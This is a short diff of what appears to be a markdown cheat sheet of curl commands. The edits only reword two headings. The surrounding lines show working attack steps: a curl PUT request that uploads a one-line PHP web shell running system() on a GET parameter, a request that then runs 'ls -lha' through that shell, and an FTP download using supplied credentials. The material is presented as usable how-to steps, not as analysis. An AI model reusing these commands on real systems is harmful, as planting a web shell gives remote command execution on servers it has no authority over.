@@ -25,7 +25,7 @@
  # curl http://xx.xx.xx.xx
 ```
 
-#### Upload a PHP shell file
+#### Upload a PHP shell 
 ```bash
  # curl -X PUT -d '<?php system($_GET["cmd"]);' http://172.168.1.10/test/cmd.php
 
@@ -34,7 +34,7 @@
  # curl "http://172.168.1.10/test/cmd.php?cmd=ls%20-lha"
 ```
 
-#### Download files from FTP server
+#### Download files from a FTP server
 ```bash
  # curl -u ftpuser:ftppass -O ftp://ftp_server/public_html/users.txt
 
